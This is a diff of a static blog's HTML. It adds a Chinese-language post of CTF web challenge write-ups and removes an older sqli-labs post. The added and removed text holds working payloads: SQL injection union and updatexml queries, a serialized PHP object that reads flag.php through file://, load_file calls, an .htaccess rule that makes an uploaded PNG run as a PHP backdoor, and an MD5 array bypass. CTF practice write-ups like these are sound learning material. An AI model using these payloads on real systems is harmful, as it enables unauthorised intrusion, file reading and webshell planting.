@@ -71,6 +71,81 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-page-46" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/05/03/page-46/" class="article-date">
+  <time class="dt-published" datetime="2021-05-02T23:58:56.000Z" itemprop="datePublished">2021-05-03</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/05/03/page-46/">刷题4</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p><strong>[网鼎杯2018]fakebook题解</strong>  先注册一个 然后发现/view.php?no=1 貌似可以sql注入?no=-1 显示了Notice: Trying to get property of non-object in /var/www/html/view.php on line 53 数字型 的所有就?no=0  扫后台发现robots.txt 然后又发现一个user.php.bak   可以大概猜一猜flag位置<br>然后这又是一个序列化题目<br>&lt;?php</p>
+<p>class UserInfo<br>{<br>    public $name = “aaad”;<br>    public $age = 19;<br>    public $blog = “file:///var/www/html/flag.php”;</p>
+<pre><code>public function __construct($name, $age, $blog)
+&#123;
+    $this-&gt;name = $name;
+    $this-&gt;age = (int)$age;
+    $this-&gt;blog = $blog;
+&#125;
+
+function get($url)
+&#123;
+    $ch = curl_init();
+
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    $output = curl_exec($ch);
+    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    if($httpCode == 404) &#123;
+        return 404;
+    &#125;
+    curl_close($ch);
+
+    return $output;
+&#125;
+
+public function getBlogContents ()
+&#123;
+    return $this-&gt;get($this-&gt;blog);
+&#125;
+
+public function isValidBlog ()
+&#123;
+    $blog = $this-&gt;blog;
+    return preg_match(&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;, $blog);
+&#125;
+</code></pre>
+<p>}<br>$a = new UserInfo(“aaad”,19,”file:///var/www/html/flag.php”);<br>var_dump(serialize($a));<br>?&gt;   构造这个然后复制一波 aaad 19 4399 这些是自己弄 要弄什么都可以 ?no=-1/<strong>/union/</strong>/select/<strong>/1,2,3,’O:8:”UserInfo”:3:{s:4:”name”;s:4:”aaad”;s:3:”age”;i:19;s:4:”blog”;s:29:”file:///var/www/html/flag.php”;}’  然后右键查看源码 有个data text 啥的<br>那段复制然后base64解码就可<br>或者因为sql注入没有过滤load_file直接取得flag<br>no=-1 union/</strong>/select 1,load_file(“/var/www/html/flag.php”),3,4<br><strong>[GXYCTF2019]BabySQli 1</strong>  union select 1，2，3   在这个关要构造假身份     利用sqli的特性：在联合查询并不存在的数据时，联合查询就会构造一个虚拟的数据。select * from ‘users’ where name=’person’ union select 1,’admin’,’e10adc3949ba59abbe56057f20f883e’,4,5    按照我们的输入，sqli在数据库中写入数据，相当于伪造了一个身份，就可以用这个身份登录了。<br>试探id username password 这三个的顺序如何 name=aaa’ union select ‘admin’,2 #&amp;pw=qqq   显示wrong user<br>name=aaa’ union select 1,’admin’,3 #&amp;pw=qqq 显示wrong password   然后把3 改成qqq的MD5加密形式就可以了<br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3674%EF%BC%88%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%89">https://xz.aliyun.com/t/3674（反序列化的一些知识点）</a><br><strong>[MRCTF2020]你传你🐎呢 1</strong><br><strong>&lt;FilesMatch “1.png”&gt;</strong><br><strong>SetHandler application/x-httpd-php</strong><br><strong></FilesMatch></strong>  传一个这样的.htaccess  这个是将1.png 默认成php   然后传一个1.png的后门文件就可以了<br><strong>[MRCTF2020]Ez_bypass 1</strong>又是一题MD5 比较的 那就数组绕过?gg[]=1&amp;id[]=2<br>然后post一个passwd=1234567a就可以了  因为  if($passwd==1234567)</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/05/03/page-46/" data-id="ckroqtflt000uyww74dy3gm2e" data-title="刷题4" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-page-45" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2021/05/03/page-45/" class="article-date">
@@ -701,58 +776,6 @@ var_dump(serialize($a));
 
 
   
-    <article id="post-page-30" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/02/18/page-30/" class="article-date">
-  <time class="dt-published" datetime="2021-02-18T09:50:50.000Z" itemprop="datePublished">2021-02-18</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/02/18/page-30/">sqlilabs 50 51 52 53 54 55 56 57 58-65</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>50 51 这两关是堆叠注入没什么差别好像除了51有个单引号</p>
-<p>52 53 又关闭了报错 然后堆叠也可以弄一弄 用sqlmap 直接解决</p>
-<p>54 单引号 55括号 56 ‘) 57”  54-57这几关有次数限制 然后和之前用union select 的一样就获取数据的</p>
-<p>要获取的是secret_（后面这串是随机的） 这个列里头的数据 获取玩提交一下就可以了</p>
-<p>58 先随便试一试 存在报错信息  而且union select的没有回显只好用报错了</p>
-<p>?id=0’ and updatexml(1,(select concat(1,(select table_name from information_schema.tables where table_schema=’challenges))),1) –+   查表</p>
-<p>?id=0’ and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=’mz8xr9yz2a’),0x7e),1)–+ 查列</p>
-<p>?id=0’ and updatexml(1,concat(0x7e,(select secret_VP4R from challenges.mz8xr9yz2a),0x7e),1) –+ 查到数据提交就ok了</p>
-<p>59数字型?id=0 其余同上一关</p>
-<p>60 ?id=0”) 61 ?id=0’)) </p>
-<p>62关了报错 但是存在明显延迟时间盲注 那就用sqlmap吧  62手动注入’)</p>
-<p>63 手动注入的话单引号闭合</p>
-<p>64 俩括号 </p>
-<p>65双引号加个括号 这几关都是时间盲注 用sqlmap吧 </p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/02/18/page-30/" data-id="ckroqtfln000jyww75y9rdob9" data-title="sqlilabs 50 51 52 53 54 55 56 57 58-65" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
   <nav id="page-nav">
@@ -793,6 +816,10 @@ var_dump(serialize($a));
           </li>
         
           <li>
+            <a href="/2021/07/29/page-80/">CISCN2019 华东南赛区Web11</a>
+          </li>
+        
+          <li>
             <a href="/2021/07/21/page-79/">MRCTF2020Ezpop</a>
           </li>
         
@@ -802,10 +829,6 @@ var_dump(serialize($a));
         
           <li>
             <a href="/2021/07/21/page-77/">网鼎杯 2020 朱雀组Nmap</a>
-          </li>
-        
-          <li>
-            <a href="/2021/07/16/page-76/">羊城杯 2020image_rar</a>
           </li>
         
       </ul>
